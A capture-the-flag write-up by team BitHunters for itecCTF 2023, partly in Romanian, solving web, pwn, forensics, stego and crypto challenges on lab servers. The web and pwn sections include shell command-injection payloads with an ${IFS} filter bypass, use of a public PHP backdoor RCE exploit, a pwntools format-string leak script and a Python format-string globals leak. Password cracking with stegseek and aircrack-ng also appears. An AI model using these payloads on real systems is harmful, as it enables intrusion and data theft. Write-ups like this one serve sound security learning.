# itecCTF2023
Writeups for the 2023 edition of itecCTF

## Team BitHunters
Write-Up Authors: 
- Leonnis12
- Cristi112277

---

# Web Challenges:

# Flamanzila:
- Flag: ITEC{T1E_1T1_PL4C_PR1J1TURI1LE}

## Challenge description:
>Lui Flamanzila ii plac foarte mult prajiturile. Daca ii dai ceea ce el vrea, o sa ti dea si el ceva in schimb.
>http://64.226.75.15:60120 

## Write up
Upon entering the endpoint, we are greeted with the following message:
><?php
>if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/flag' && $_COOKIE['flag'] === 'true' && $_COOKIE['cookie2'] === 'give it') {
>  echo "Poftim: \n";
>  echo file_get_contents('flag.txt');
>} else {
>  highlight_file(__FILE__);
>}
>?>

We can assume this is the sourcecode of the webpage, so after changing the request parameters with Postman to match the code, we obtain the flag.


# Vacuta_milka_1:
- Flag: ITEC{V4CUTA_M1LKA_4_U1TAT_D3_INJ3CT4R3A_DE_C0M3NZ1} 

## Challenge description:
>Vacuta milka vrea sa vorbeasca cu tine.
>http://64.226.75.15:60121 

## Write up
The website contains a POST form with a message input field.


![Challenge form](https://i.imgur.com/bz1KjX9.png)


The input is not processed and run using cowsay. After some trial and error, we find that bash variables are replaced in the processed output, so by inputting a command in a variable, we can execute it.
>$tmp=`cat flag`;print "$tmp";



# Vacuta_milka_2:
- Flag: ITEC{V4CUTA_M1LKA_4_C0M1S0_D1NOU}

## Challenge description:
>Acum s-a suparat si nu mai vrea sa raspuna la orice cuvant :(
>http://64.226.75.15:60122 

## Write up
This task is simmilar to te previous one, except characters are filtered, and the output is not shown unless the command contains only characters from A-Za-z09&$

After a lot of trial an error this time, and discovering how to print environment variables in this context, we found we can run commands by inputting

> &ls&$ls&$ls&

In fact any command between & signs is executed. So, after listing the current directory, reading from the flag file was the next step, which we accomplished by using the bash ${IFS} variable which replaces a space and is not blacklisted. Thus we obtained our final payload (more convoluted actually than it needs to be).
```
 $ls&cat${IFS}flag&$0
```

# Usa Secreta:
- Flag: ITEC{A1_INTR4T_P3_USA_D1N_SP1TE3}

## Challenge description:
>Poti sa gasesti usa secreta? Poate te ajuta vreun header
>http://64.226.75.15:60123 

## Write up
The challenge description was a big hint, as the backdoor referenced was an Remote Shell exploit, we could identify as viable through the headers of the webpage.
>X-Powered-By: PHP/8.1.0-dev

__Reference:__
[Flast101 PHP-8.1.0-dev-RCE](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) - Flast101 PHP-8.1.0-dev-RCE

After gaining remote shell, we accessed the flag at
>cat ../../../flag.php


---

# Reverse Engineering:

# Fata Morgana:
- Flag: ITEC{f4t4_m0rg4na_ba73_camp11_Cu_un_POKEMON}

## Challenge description:
>Din departare se zareste un flag, dar cu cat te apropii mai mult de el, pare sa dispara.

## Write up
After opening the binary file with IDA and navigating to the main function, we decompiled it, and started renaming and organising things to be easier to read.
![IDA view](https://i.imgur.com/3B9rk2D.png)
It was easy to observe that the first 16 bytes of the read input are compared with an MD5 hash that is stored in the data section.
>c41dca10e4c04d9e0251b5b99bb597b9:ITEC
After decoding it online, we found it was the string ITEC. This would have been necessary to pass using a debugger to the next important portion of the program (although it can be skipped then as well), but, we went along and just patched the binary with a nop where the MD5 check jnz instruction compares the result. Thus, we only found the decoded md5 hash later when trying to get the actual flag.

The next important portion of the main function copies at a memory location data from the data section which is then called as a virtual function using fastcall at line 49.
![IDA view 2](https://i.imgur.com/SsJ5YVD.png)
 
When looking at the data section we tried to convert the data directly to instructions to understand what is happening, but decided it was easier to just debug the application using edb. After manually placing breakpoints and navigating the code with IDA open side by side, we ran inside the virtual function and found the flag location loaded in a register.

![IDA view 3](https://i.imgur.com/b35F38T.png)


---

# Pwnable:

# Ochila 2.0:
- Flag: ITEC{Ochila_frate_cu_Orbila_var_primar_cu_Chiorila}

## Challenge description:
>Ochilă se laudă că securitatea lui este mai bună decat a amicilor săi, insă ii tot fug ochii cu mult dupa canary, oare ce s-ar putea găsi acolo?
>nc 64.226.75.15 60101 

## Write up
After a first look at the source file, it was easy to notice that even though fgets prevents an overflow using the size of the buffer, printf is used just after without any check, allowing use to use a format string exploit to leak data from the heap with %s.

We came up with the following exploit, which although simple in nature, printing all the ranges we can from the memory, does the job and prints our flag on the remote server.

>from pwn import *
>
>for i in range(100):
>  try:
>    sh =remote('64.226.75.15',60101)
>    sh.sendlineafter('Unde ?\n', '%{}$s'.format(i))
>    print sh.recvuntil('Unde ?\n')
>    sh.close()
>  except EOFError:
>    pass


---

# Steganography:

# Apus in Timisoara:
- Flag: ITEC{T1M1S04RA_3_FRUM0ASA_S1_UNIC4_NU_I_ASA??}

## Challenge description:
>O poza minunata cu un apus in Timisoara. Sau e mai semnificativa de atat??

## Write up
Am vazut ca scrie in hint "Semnificativ"
Dupa aceea m-am dus cu gandul la lsb sau msb
Am zis ca gasesc un site care sa aiba un solver pentru lsb

https://stylesuxx.github.io/steganography/

Am gasit era flagul encriptat cu Ceaser cypher

VGRP{G1Z1F04EN_3_SEHZ0NFN_F1_HAVP4_AH_V_NFN??}

Si flagul dupa ceaser


# Poza Itec:
- Flag: ITEC{ST1AI_CA_P0T1_4SCUND3_F1S1ER3_4N_POZ3??!}

## Challenge description:
>Am primit aceasta poza. Presimt ca se ascunde ceva in ea, poti sa imi spui ce ?

## Write up
We spent a lot of time trying to solve this task. We notices straight away the bytes at the begining of the image that show up in files altered with steghide, but were not able to crack it with tools we had on hand. 

![Poza Itec HxD](https://i.imgur.com/XHiyz0t.png)

After an hour or so of brute-forcing, we found a recommandation online to switch to stegseek, which was significantly faster than our tools. After switching, the password was cracked in a few seconds, and the rest was easy.

>stegseek Group_1.jpg
>paola20vargas13
>steghide extract -sf ./Group_1.jpg



---

# Forensics:

# Trafic suspect:
- Flag: ITEC{Exf1ltr4r3a_Pr1n_Dns_Nu_E_S1lentio4sa}

## Challenge description:
>Dintr-o data am observat pe trafic mai multe request-uri DNS, ceea ce e putin suspect. Misiunea ta e sa afli ce a exfiltrat atacatorul.

## Write up
After opening the pcap file, we observed a lot of dns requests, with different subdomains that looked like hex bytes, so we exported the packets as a string, and edited the output to keep only the subdomains.
>49 49 54 54 45 45 43 7b 7b 45 78 78 66 66 31 6c 6c 74 74 72 34 34 72 72 33 33 61 61 5f 5f 50 50 72 31 31 6e 6e 5f 44 44 6e 73 5f 5f 4e 4e 75 75 5f 5f 45 5f 5f 53 31 31 6c 65 65 6e 6e 74 74 69 69 6f 6f 34 73 73 61 7d 

After converting to ascii we got the flag.


# Tenis de masa:
- Flag: ITEC{P1NG_P0NG_PIN5_PON5_PING_PONGGG}

## Challenge description:
>Ochila a mai observat inca o data ceva ciudat, acum sunt multe packete de tip ICMP. Poti sa-l ajuti sa gaseasca ce se afla in ele

## Write up
After opening the pcap file, we observed a lot of ICMP requests with consistent different ids in hex. We started converting them one by one and the output matched the flag format, so we exported everything, processed it and from the hex encoded string we got the flag.
![Tenis de masa pcap](https://i.imgur.com/uNoS1O1.png)


# Prietenie:
- Flag: ITEC{vrajitoarea}

## Challenge description:
>Ochila s-a suparat de Setila, si vrea sa se conecteze la reteaua sa. A reusit sa captureze acest trafic, poti tu oare sa-l ajuti sa afle parola ? FLAG FORMAT :ITEC{parola}

## Write up
The pcap file contained the 4 packets needed for wpa authentication, so we used aircrack-ng to crack the password.
>aircrack-ng prietenie.pcap -w /usr/share/wordlists/rockyou.txt

The password was: vrajitoarea

---

# Miscellaneous:

# Format:
- Flag: ITEC{S4_NU_A1_1NCREDER3_1N_F0RM4T}

## Challenge description:
>Un fel de vacuta milka, doar ca nu asa fancy si fara vacuta :))

## Write up
This task had the flag written in plaintext in the source file :P


# Format #2:
- Flag: {message.\_\_init\_\_.\_\_globals\_\_}

## Challenge description:
>Ca primul, doar ca fara flag in cod... P.S:Acum merge remote.
> http://64.226.75.15:60109 

## Write up
This task was easy, as the user input was placed directly in a string format, in the sourcecode. This ment that we could acces the local python variables using the payload
>{message.\_\_init\_\_.\_\_globals\_\_}


# Arta:
- Flag: ITEC{P1ET_M0NDR1AN_A_F0ST_UN_P1CT0R}

## Challenge description:
>Se zice ca fiecare opera de arta transmite ceva. Ce iti transmite aceasta ? (este de origine olandeza)

## Write up
Din hint zicea despre "origine olandeza", dupa aceea m-am gandit ca ar fi un cypher de origine olandeza si am cautat pe net dutch painter cypher, dutch painter encryption, dutch painter etc..
Am dat de o pagina de wikipedia a lui Piet Mondrian, Piet fiind un limbaj de programare interpretat prin imagini
Dupa umpic mai mult am gasit un interpreter online care mi-a dat si flagul (http://www.bertnase.de/npiet/care)

Cui nu-i plac operele de arta?

# Gheorghe cel voinic:
- Flag: ITEC{Și_încălecai_pe-o_căpșună_și_vă_spusei_o_minciună}

## Challenge description:
>După o noapte petrecută la pândă, Gheorghe zăreste hotul de mere. Urmăreste-l in prin labirint și il vei putea prinde la ultimul nivel.
>nc 64.226.75.15 60005 

## Write up
La prima vedere pare a fi un simplu joc de a da inputuri si a ajunge la finalul nivelului, dar se pare ca exista un timeout care se pune pe nc (undeva la 10 secunde)

Am creat un fisier text si am trecut la treaba facand drumul lui Gheorghe

Pana la nivelul 3 am trecut manual iar la ultimul nivel am facut bruteforce dand multe dreapta/jos in speranta de a avea noroc cu randomizerul

Dupa cateva incercari a reusit


---

# Cryptograohy:

# Spanzuratoarea:
- Flag: ITEC{tr41m_4l4tur1_d3_34_p4n4_mur1m_474rna71_d3_34}

## Challenge description:
>Incepe ora de matematica, iar domnul profesor propune sa jucati jocul “spânzuratoarea”. Insă regulile arată putin diferit: aveti o singura sansă să ghiciti intreg cuvantul, iar pentru fiecare literă există anumite constrangeri. Succes!

## Write up
Prezentat cu multe multe asserturi am inceput sa ma gandesc cum pot calcula litere din Flag

Am inceput cu ce stiam adica ITEC{...}
Pentru a afla fiecare litera a trebuit sa facem operatiile inverse de exemplu:

>tmp1 = ord(cuvant[3]) 
>tmp2 = ord(cuvant[27]) 
>assert (tmp1 ^ 91) ^ tmp2 == 118 

Stiind ca, cuvant[3] = 'C'

Putem face tmp2 = (ord('c') ^ 91) ^ 118 
Asa afland urmatoarea litera

Dupaia continui pe aceeasi idee pana gasesti toate literele. (Munca de chinez batran)


# Bisnitar:
- Flag: ITEC{nu_umbl4_cu_0c4u4_m1c4}

## Challenge description:
>Un negustor isi intinde masa, in fiecare dimineată, pentru a servi străinii cumpărători cu un schimb valutar pe cinste. Numai că cinstea acestuia este adesea discutată pe la colturi de drum. Plătește-i cu aceiasi monedă!
>nc 64.226.75.15 60000 

## Write up
Cel mai greu task

In primul rand am incercat manual sa vad ce fel de raspunsuri am primi de la server.

Am incercat multe combinatii dar am vazut ca daca ajungi cu una din valorile negustorului la 0 poti strica formula iar acesta iti va da toti 20 de banii fara a conta ce valoare schimbi tu.
Am incercat o serie de inputuri si am gasit o solutie din 9 mutari care evident nu era corecta.

De aici a fost doar un timp doar pana am incercat multe valori cu scriptul care l-am facut pentru a vedea cum poti ajunge la 0 in sub 8 mutari;

Seria de input
```
1S7
1N10
1N1 x 5
1S1 
```

```
#!/usr/local/bin/python3

import os
from random import Random
import requests
import random
negustor_stoc_solidus = 0
negustor_stoc_nomisma = 0
client_stoc_solidus = 0
client_stoc_nomisma = 0
def getValues():
    negustor_stoc_solidus = 17
    negustor_stoc_nomisma = 5
    client_stoc_solidus = 3
    client_stoc_nomisma = 15
    return negustor_stoc_solidus, negustor_stoc_nomisma, client_stoc_solidus, client_stoc_nomisma
negustor_stoc_solidus, negustor_stoc_nomisma, client_stoc_solidus, client_stoc_nomisma = getValues()

for i in range(0,client_stoc_nomisma + 1):
    schimb = 0;
    x = negustor_stoc_nomisma
    y = negustor_stoc_solidus
    if(x+i != 0):
        schimb = y - (x * y) // (x + i)
    else:
        continue
    negustor_stoc_nomisma += i
    negustor_stoc_solidus -= schimb 

    client_stoc_nomisma -= i
    client_stoc_solidus += schimb 
    print(negustor_stoc_solidus,negustor_stoc_nomisma,client_stoc_solidus, client_stoc_nomisma,client_stoc_solidus + client_stoc_nomisma)
    if(client_stoc_solidus + client_stoc_nomisma == 39):
        print("Adevarul: " + str(i))
    negustor_stoc_solidus, negustor_stoc_nomisma, client_stoc_solidus, client_stoc_nomisma = getValues()
print("\n\n")
negustor_stoc_solidus, negustor_stoc_nomisma, client_stoc_solidus, client_stoc_nomisma = getValues()
for i in range(0,client_stoc_solidus + 1):
    schimb = 0
    x = negustor_stoc_solidus
    y = negustor_stoc_nomisma
    if(x+i != 0):
        schimb = y - (x * y) // (x + i)
    else:
        continue
    negustor_stoc_solidus += i 
    negustor_stoc_nomisma -= schimb
    
    client_stoc_solidus -= i 
    client_stoc_nomisma += schimb
    print(negustor_stoc_solidus,negustor_stoc_nomisma,client_stoc_solidus, client_stoc_nomisma, client_stoc_solidus + client_stoc_nomisma)
    if(client_stoc_solidus + client_stoc_nomisma == 39):
        print("Adevarul: " + str(i))
    negustor_stoc_solidus, negustor_stoc_nomisma, client_stoc_solidus, client_stoc_nomisma = getValues()
```


# O scrisoare pierduta:
- Flag: ITEC{https://youtu.be/niiYWyglQMM}

## Challenge description:
>Cetățeanul turmentat iți inmana o scrisoare de amor. Insă in forma ei actuala, nu poate fi folosită drept șantaj. O poti tu oare desluși?
>nc 64.226.75.15 60002 

## Write up
Primul lucru care l-am observat ii ca cheia si mesajul trebuie neaparat sa fie:

cheia: 9 caractere
mesajul: 66 carectere

Apoi am observat ca

>        c11 = ( (a11 * p11) + (a12 * p21) + (a13 * p31) ) % 26
>        c21 = ( (a21 * p11) + (a22 * p21) + (a23 * p31) ) % 26
>        c31 = ( (a31 * p11) + (a32 * p21) + (a33 * p31) ) % 26

Arata ca o inmultire de matrici de genul 

> [a11, a12, a13]   [p11]   [c11]
> [a21, a22, a23] * [p21] = [c21]
> [a31, a32, a33]   [p31]   [c31]

Deci asta inseamna ca se iau cate 3 caractere din string si se encripteaza din 3 in 3 cu o cheie de 3x3

Dar noi stim valorile initiale la primele 9 caractere astea fiind [4,15,11,0,13,4,19,19,19] dar si cele finale fiind [19,16,17,24,22,8,5,15,16]

Am creat un script care trece de 3 ori pentru a egala fiecare row din cheie.

Pe scurt functioneaza cam asa

```
[a11, a12, a13] * [4]  = 19    
		  [15]         
		  [11]           

[a11, a12, a13] * [0]  = 24
		  [13]
		  [4]
		  
[a11, a12, a13] * [19]  = 5
	          [19]
		  [19]

[a21, a22, a23] * [4]  = 16
	          [15]         
		  [11]           

[a21, a22, a23] * [0]  = 22
		  [13]
		  [4]

[a21, a22, a23] * [19] = 15
		  [19]
		  [19]

[a31, a32, a33] * [4]  = 16
		  [15]         
		  [11]           

[a31, a32, a33] * [0]  = 22
		  [13]
		  [4]

[a31, a32, a33] * [19] = 15
		  [19]
		  [19]
```
La inceput am luat variabile in range [0,50] dar ne-am dat seama ca avand nevoie de valori ascii 
va trebui sa marim rangeul la [80,120]. 

Cheia gasita a fost: [90, 102, 97, 101, 104, 90, 103, 84, 93] (dar is multe nu e singura cheie)

Apoi vine partea de gasire a mesajului aici avand deja formula:

>[a11, a12, a13]   [p11]   [c11]
>[a21, a22, a23] * [p21] = [c21]
>[a31, a32, a33]   [p31]   [c31]


A fost destul de usor de gasit valorile finale trebuind doar sa dau valori la c11,c21,c31 pana cand erau egale

Din nou ne-am dat seama ca va trebui sa avem valori ascii deci am aplicat aceeasi idee de range [80,120]

Iar surpriza a iesit si mesajul:
>[94, 82, 91, 97, 91, 103, 95, 91, 93, 95, 80, 99, 102, 86, 91, 102, 92, 86, 95, 89, 105, 85, 80, 95, 93, 86, 102, 99, 91, 104, 95, 86, 95, 94, 82, 103, 102, 91, 82, 91, 83, 93, 82, 85, 93, 95, 81, 95, 94, 82, 85, 103, 86, 104, 103, 86, 95, 90, 81, 95, 104, 92, 91, 80, 84, 95]

De aici a lipsit doar sa transformam din ascii in litere
```
 msg: ^R[a[g_[]_PcfV[f\V_YiUP_]Vfc[h_V_^Rgf[R[S]RU]_Q_^RUgVhgV_ZQ_h\[PT_
 key: ZfaehZgT]
```

Primul Script
```
c1 = [[4, 15, 11], [0, 13, 4], [19, 19, 19]]
c2 = [[19, 24, 5], [16, 22, 15], [17, 8, 16]]
solution = []
for i in range(len(c1)):
    found = False
    for a in range(80, 120):
        for b in range(80, 120):
            for c in range(80, 120):
                if ( c1[0][0] * a + c1[0][1] * b + c1[0][2] * c) % 26 == c2[i][0] \
                    and (c1[1][0] * a + c1[1][1] * b + c1[1][2] * c) % 26 == c2[i][1] \
                    and (c1[2][0] * a + c1[2][1] * b + c1[2][2] * c) % 26 == c2[i][2]:
                    solution.extend([a, b, c])
                    found = True
                    break
            if found:
                break
        if found:
            break
print(solution)
```

Al doilea script
```
results=  [[15, 4, 21], [1, 9, 18], [21, 25, 0], [1, 19, 24], [25, 6, 11], [22, 24, 24], [19, 13, 12], [13, 1, 0], [22, 9, 3], [18, 15, 5], [17, 23, 0], [9, 18, 19], [0, 2, 10], [15, 11, 8], [7, 12, 3], [1, 23, 22], [5, 10, 9], [24, 3, 23], [9, 25, 18], [19, 12, 1], [11, 0, 19], [23, 16, 3]]
solution = []
for i in range(len(results)):
    found = False
    for a in range(80, 120):
        for b in range(80, 120):
            for c in range(80, 120):
                if (90 * a + 102 * b + 97* c) % 26 == results[i][0] and (101 * a + 104 * b + 90 * c) % 26 == results[i][1] and (103 * a + 84 * b + 93 * c) % 26 == results[i][2]:
                    solution.extend([a, b, c])
                    found = True
                    break
            if found:
                break
        if found:
            break
print(solution)
```
